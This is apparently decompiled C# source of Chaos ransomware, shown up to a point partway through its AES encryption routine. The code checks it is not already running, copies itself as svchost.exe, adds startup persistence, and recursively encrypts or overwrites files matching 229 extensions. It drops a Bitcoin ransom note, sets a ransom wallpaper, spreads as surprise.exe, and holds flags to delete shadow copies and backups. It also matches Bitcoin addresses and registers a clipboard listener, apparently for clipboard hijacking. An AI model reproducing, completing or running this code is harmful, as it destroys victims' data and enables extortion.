using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>uRA6LSBLuQLSD1C14lVxgXlJ1YSEJmMAimWFKDE0US+ZZP3yrMNF7PVJ53ni+wtcIQ1khdpLSdNhXAIp9GjbceOwhQ5SHoBPJ9uQhcWlKTt6hfESFTUzsJANYsXWBnpqIP+tNaBEirMfxCRm0rzZvMNvtxdQNvqZ3IrKpTjS6M0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
